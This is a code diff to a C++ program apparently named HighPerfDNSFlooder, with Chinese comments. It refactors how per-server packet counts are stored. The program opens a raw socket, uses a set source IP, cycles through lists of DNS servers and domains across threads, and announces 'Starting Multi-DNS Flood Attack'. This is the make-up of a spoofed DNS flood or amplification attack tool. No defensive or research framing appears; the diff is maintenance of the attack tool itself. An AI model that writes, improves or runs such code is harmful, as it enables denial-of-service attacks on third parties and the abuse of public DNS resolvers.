@@ -1,8 +1,6 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#include <fcntl.h>
-#include <unistd.h>
 #include <string>
 #include <thread>
 #include <atomic>
@@ -44,12 +42,9 @@ private:
     std::atomic<uint64_t> packets_failed;
     std::atomic<bool> running;
     
-    // 使用vector存储atomic，但需要手动管理
-    struct ServerStat {
-        std::atomic<uint64_t> count;
-        ServerStat() : count(0) {}
-    };
-    std::vector<ServerStat> server_stats;
+    // 使用原始数组来避免atomic的复制问题
+    std::atomic<uint64_t>* server_stats;
+    size_t server_count;
     
     uint16_t checksum(uint16_t *buf, int len) {
         uint32_t sum = 0;
@@ -81,7 +76,7 @@ private:
     
     // 轻量级的轮询选择
     size_t get_server_index(uint64_t sequence) {
-        return sequence % dns_servers.size();
+        return sequence % server_count;
     }
     
     // 轻量级的域名选择
@@ -183,7 +178,7 @@ private:
             
             if (sent > 0) {
                 packets_sent++;
-                server_stats[server_idx].count++;
+                server_stats[server_idx]++;
             } else {
                 packets_failed++;
             }
@@ -199,7 +194,8 @@ private:
 
 public:
     HighPerfDNSFlooder(const std::string& src_ip) 
-        : source_ip(src_ip), packets_sent(0), packets_failed(0), running(false) {
+        : source_ip(src_ip), packets_sent(0), packets_failed(0), running(false), 
+          server_stats(nullptr), server_count(0) {
         
         raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (raw_sock < 0) {
@@ -220,6 +216,9 @@ public:
         if (raw_sock >= 0) {
             close(raw_sock);
         }
+        if (server_stats) {
+            delete[] server_stats;
+        }
     }
     
     // 从文件加载DNS服务器
@@ -234,12 +233,20 @@ public:
         while (std::getline(file, line)) {
             if (!line.empty()) {
                 dns_servers.push_back(line);
-                server_stats.push_back(ServerStat()); // 正确构造ServerStat
             }
         }
         
-        std::cout << "Loaded " << dns_servers.size() << " DNS servers from " << filename << std::endl;
-        return !dns_servers.empty();
+        server_count = dns_servers.size();
+        if (server_count > 0) {
+            // 使用动态数组来避免atomic复制问题
+            server_stats = new std::atomic<uint64_t>[server_count];
+            for (size_t i = 0; i < server_count; ++i) {
+                server_stats[i] = 0;
+            }
+        }
+        
+        std::cout << "Loaded " << server_count << " DNS servers from " << filename << std::endl;
+        return server_count > 0;
     }
     
     // 从文件加载域名
@@ -259,17 +266,6 @@ public:
         
         std::cout << "Loaded " << domains.size() << " domains from " << filename << std::endl;
         return !domains.empty();
-    }
-    
-    // 添加单个DNS服务器
-    void add_dns_server(const std::string& server) {
-        dns_servers.push_back(server);
-        server_stats.push_back(ServerStat());
-    }
-    
-    // 添加单个域名
-    void add_domain(const std::string& domain) {
-        domains.push_back(domain);
     }
     
     // 开始洪水攻击
@@ -293,8 +289,8 @@ public:
         packets_failed = 0;
         
         // 重置服务器统计
-        for (auto& stat : server_stats) {
-            stat.count = 0;
+        for (size_t i = 0; i < server_count; ++i) {
+            server_stats[i] = 0;
         }
         
         std::vector<std::thread> threads;
@@ -302,7 +298,7 @@ public:
         std::cout << "==========================================" << std::endl;
         std::cout << "Starting Multi-DNS Flood Attack" << std::endl;
         std::cout << "Source IP: " << source_ip << std::endl;
-        std::cout << "DNS Servers: " << dns_servers.size() << std::endl;
+        std::cout << "DNS Servers: " << server_count << std::endl;
         std::cout << "Domains: " << domains.size() << std::endl;
         std::cout << "Threads: " << thread_count << std::endl;
         std::cout << "==========================================" << std::endl;
@@ -330,11 +326,11 @@ public:
                          << " | Failed: " << packets_failed.load() << std::endl;
                 
                 // 显示每个DNS服务器的统计
-                if (!server_stats.empty()) {
+                if (server_count > 0) {
                     std::cout << "Server Distribution: ";
-                    for (size_t i = 0; i < dns_servers.size(); ++i) {
+                    for (size_t i = 0; i < server_count; ++i) {
                         if (i > 0) std::cout << ", ";
-                        std::cout << dns_servers[i] << "=" << server_stats[i].count.load();
+                        std::cout << dns_servers[i] << "=" << server_stats[i].load();
                     }
                     std::cout << std::endl;
                 }
@@ -365,9 +361,11 @@ public:
         std::cout << "Total packets failed: " << packets_failed << std::endl;
         
         // 显示最终统计
-        std::cout << "Final Server Distribution:" << std::endl;
-        for (size_t i = 0; i < dns_servers.size(); ++i) {
-            std::cout << "  " << dns_servers[i] << ": " << server_stats[i].count.load() << " packets" << std::endl;
+        if (server_count > 0) {
+            std::cout << "Final Server Distribution:" << std::endl;
+            for (size_t i = 0; i < server_count; ++i) {
+                std::cout << "  " << dns_servers[i] << ": " << server_stats[i].load() << " packets" << std::endl;
+            }
         }
     }
     
